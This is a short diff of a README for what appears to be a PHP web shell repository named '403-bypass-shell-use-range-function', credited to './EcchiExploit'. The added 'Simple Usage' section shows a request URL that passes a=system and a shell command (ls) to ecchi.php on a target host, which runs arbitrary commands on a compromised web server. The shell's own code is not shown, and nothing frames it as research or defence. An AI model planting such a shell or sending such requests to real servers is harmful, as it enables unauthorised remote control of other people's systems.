@@ -1,2 +1,6 @@
 # 403-bypass-shell-use-range-function
-PHP WebShell By ./EcchiExploit
+
+## Simple Usage
+```
+http://target.com/ecchi.php?a=system&ecchi=ls
+```
